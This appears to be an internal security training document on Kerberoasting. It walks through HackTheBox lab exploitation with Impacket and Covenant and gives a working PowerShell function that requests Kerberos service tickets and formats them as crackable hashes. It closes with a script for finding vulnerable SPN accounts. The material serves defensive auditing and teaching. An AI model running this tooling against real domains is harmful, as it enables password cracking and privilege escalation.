# Identifying Accounts Vulnerable To Kerberoasting

As we saw last week in [Privilege Escalation Using Active Directory](./docs/Privilege%20Escalation%20Using%20Active%20Directory.md), any domain user can interact with AD and look for ways to escalate privileges.  One way to do this is to obtain a Kerberos ticket for a service and extract a portion of it that is encrypted with the NTLM hash of a user account's plaintext password. This ciphertext can then be fed to a tool and cracked offline avoiding failed logon attempts and AD account lockouts. 

This technique known as *Kerberoasting* and this training document will review how it's used and ways to identify accounts in the environment that would be the most vulnerable:

- [Kerberoasting Process](#kerberoasting-process)
- [Emulating In A Test Environment](#emulating-in-a-test-environment)
- [Simulating The Technique](#simulating-the-technique)
- [Searching Our Environment](#searching-our-environment)


## Kerberoasting Process

See [Authentication Using Smart Cards and Public Key Kerberos](./docs/Authentication%20Using%20Smart%20Cards%20and%20Public%20Key%20Kerberos.md) for a refresher on how Kerberos works.

In order to access a host or service on our network, an entity must prove their identity to the KDC and receive a Ticket Granting Ticket (TGT). The TGT is valid for 10 hours and proves that the entity has successfully authenticated with the KDC.  In the event a low-privileged account is compromised, it already has a TGT:

![](images/Identifying%20Accounts%20Vulnerable%20To%20Kerberoasting/image003.png)<br><br>


To use a service, an entity requests a Service Ticket for the desired service from the KDC.  Any user can request a TGS for any service that has a registered SPN in an AD user or computer account.

When this happens, the KDC sends back a TGS-REP, part of which is encrypted with the NTLM hash of the service account's plaintext password.  For most services that are associated with computer accounts, this is no big deal since these passwords are typically changed every 30 days.  But when the SPN is associated with a user account, the user's plaintext password is used which sometimes remains unchanged for years.  

Here are some of our user accounts that have associated SPNs:

![](images/Identifying%20Accounts%20Vulnerable%20To%20Kerberoasting/image001.png)<br><br>


By requesting tickets for for user accounts which are associated with SPNs (usually service accounts), a compromised, low privilege account can be used to obtain a large collection of NTLM hashes.  Accounts that allow RC4 encryption to be used will be targeted before those that only allow AES128 and AES256 as the latter are much more difficult to crack.


## Emulating In A Test Environment

To learn more about how this attack works, we can practice in a lab setting.  There are tools that are designed to stand up an Active Directory environment but one of the easiest ways is to practice on a [Hackthebox]() VM that already has one set up.  One of these is the box called **Active**.

Nmap is one of many tools that can be used to gather information about an Active Directory environment with a valid username and password.  In this case the account `SVC_TGS` with password `GPPstillStandingStrong2k18` is used:


![](images/Identifying%20Accounts%20Vulnerable%20To%20Kerberoasting/image004.png)<br><br>

The python tool `GetUserSPNs.py` from [Impacket](https://github.com/SecureAuthCorp/impacket) can be used to request a service ticket and extract the hash:

![](images/Identifying%20Accounts%20Vulnerable%20To%20Kerberoasting/image005.png)<br><br>

Saving this hash to a file and using JTR and a wordlist containing the password is successful:

![](images/Identifying%20Accounts%20Vulnerable%20To%20Kerberoasting/image006.png)<br><br>

With the newly discovered password, [Impacket](https://github.com/SecureAuthCorp/impacket)'s `psexec.py` can be used to log on as SYSTEM:

![](images/Identifying%20Accounts%20Vulnerable%20To%20Kerberoasting/image007.png)<br><br>

In another box named **Sizzle**, after low privilege account `HTB\amanda` is taken over, it can be used to find the `mrlky` user account which is associated with an SPN:

![](images/Identifying%20Accounts%20Vulnerable%20To%20Kerberoasting/image010.png)<br><br>

Many different toolsets come with commands that can do this as well... [Covenant](https://github.com/cobbr/Covenant) is being used here:

![](images/Identifying%20Accounts%20Vulnerable%20To%20Kerberoasting/image009.png)<br><br>

The Kerberoast command requests a ticket for the SPN and formats it for cracking with [Hashcat](https://github.com/hashcat) or [John](https://github.com/magnumripper/JohnTheRipper):

![](images/Identifying%20Accounts%20Vulnerable%20To%20Kerberoasting/image008.png)<br><br>

Now that we've seen how it works, let's try to simulate it in our environment...

## Simulating The Technique

First we need to request a service ticket.  We'll use `xxxxxxxx` as an example and perform the following commands:

```powershell
Add-Type -AssemblyName System.IdentityModel
$Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList xxxxxxxx
```

We have created an object that represents the security token we'll use to request a ticket for the SPN associated with the `xxxxxxxx` account:

![](images/Identifying%20Accounts%20Vulnerable%20To%20Kerberoasting/image011.png)<br><br>

The following requests the ticket, captures the bytes, and extracts the ciphertext:

```powershell
$TicketByteStream = $Ticket.GetRequest()
$TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'

if ($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
    $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
    $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)
}
```

This is the cyphertext that is encrypted with the NTLM hash of the `xxxxxxxx` account plaintext password:

![](images/Identifying%20Accounts%20Vulnerable%20To%20Kerberoasting/image012.png)<br><br>


These next commands format the cyphertext for two common tools used for password cracking: [Hashcat](https://github.com/hashcat) and [John](https://github.com/magnumripper/JohnTheRipper):

```powershell
if ($OutputFormat -match 'John') {
    $HashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
}
else {
    if ($DistinguishedName -ne 'UNKNOWN') {
        $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
    }
    else {$UserDomain = 'UNKNOWN'    }
    $HashFormat = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
}
```
<br>

This can now be fed to a cracking tool and a wordlist and if the account's password is in the list, the ticket can be decrypted and the password identified:

We can combine these commands into the `Get-SpnEncryptedTicket` function.


```powershell
function Get-SpnEncryptedTicket {

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServicePrincipalName')]
        [String[]]$SPN,

    [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]$OutputFormat = 'John'
    )    
        
    begin {Add-Type -AssemblyName System.IdentityModel}

    process {
        $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPN
        $TicketByteStream = $Ticket.GetRequest()        
        if (!($TicketByteStream)) {Break}

        $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'
      
        if ($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
            $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
            $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
            $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)
      
            if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482') {Break} 
            else {$Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))" }
        } 
        else {Break}

        if($Hash) {
            if ($OutputFormat -match 'John') {
                $HashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
            }
            else {
                if ($DistinguishedName -ne 'UNKNOWN') {
                    $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                }
                else {$UserDomain = 'UNKNOWN'}
                $HashFormat = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
            }
            $HashFormat
        }
    }
}
```

<br>

We now have a quick way of simulating a Kerberoasting tool on our network:

![](images/Identifying%20Accounts%20Vulnerable%20To%20Kerberoasting/image013.png)<br><br>


## Searching Our Environment

Accounts that will be targeted:

- are associated with an SPN  (`$_.ServicePrincipalName`)
- allow a weak encryption algorithm to be used  (`$_.KerberosencryptionType -match 'RC4'`)
- have a publicly available or non-complex password  (`$_.PasswordLastSet`)


The `xxxxxxxx` account is a perfect example of an account that could be vulnerable to Kerberoasting.  It has an SPN, allows RC4, and the last time the password was changed was almost 9 years ago which means it's very likely the password could be on a wordlist by now:

![](images/Identifying%20Accounts%20Vulnerable%20To%20Kerberoasting/image015.png)<br><br>

If successful, this would provide an adversary an enormous escalation of privileges due to this account's memberships in multiple Admin groups:

![](images/Identifying%20Accounts%20Vulnerable%20To%20Kerberoasting/image014.png)<br><br>


We can search for accounts that would be targeted with the following:

```powershell
# Find all users with SPNs
$names = (Get-NNetUUser | ? {$_.servicePrincipalName}).samaccountname

# Find user accounts set for RC4 encryption
$rc4 = $names | %{Get-ADUser $_ -pr * | ? KerberosEncryptionType -match 'RC4' | Select samaccountname,PasswordLastSet}

# Sort by oldest PasswordLastSet date
$rc4 | Sort PasswordLastSet
```

<br>

This gives us a list of accounts starting with the ones with the oldest passwords---and therefore most likely to be non-complex, guessable, or on a wordlist somewhere:

![](images/Identifying%20Accounts%20Vulnerable%20To%20Kerberoasting/image002.png)<br><br>
